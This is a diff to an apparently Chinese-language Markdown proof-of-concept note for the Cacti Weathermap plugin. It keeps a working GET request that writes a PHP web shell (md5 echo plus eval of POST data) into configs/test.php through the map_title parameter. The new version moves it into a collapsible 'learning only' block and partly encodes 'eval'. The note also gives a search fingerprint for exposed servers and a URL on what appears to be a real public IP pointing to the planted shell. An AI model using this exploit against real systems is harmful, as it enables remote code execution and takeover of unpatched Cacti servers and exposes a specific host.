@@ -43,13 +43,16 @@ app="Cactiez"
 
 poc
 
-```
-GET /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php%20echo(md5(1));@eval($_POST[0]);?>&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">GET /plugins/weathermap/editor.php?plug=0&amp;mapname=test.php&amp;action=set_map_properties&amp;param=&amp;param2=&amp;debug=existing&amp;node_name=&amp;node_x=&amp;node_y=&amp;node_new_name=&amp;node_label=&amp;node_infourl=&amp;node_hover=&amp;node_iconfilename=--NONE--&amp;link_name=&amp;link_bandwidth_in=&amp;link_bandwidth_out=&amp;link_target=&amp;link_width=&amp;link_infourl=&amp;link_hover=&amp;map_title=&lt;?php%20echo(md5(1));@&#101;val(&#36;_POST[0]);?&gt;&amp;map_legend=Traffic+Load&amp;map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&amp;map_linkdefaultwidth=7 HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
 Accept: */*
-Cookie: Cacti=xxx
-```
+Cookie: Cacti=xxx</code></pre>
+
+</details>
 
 ```
 http://114.242.111.210:8088/plugins/weathermap/configs/test.php
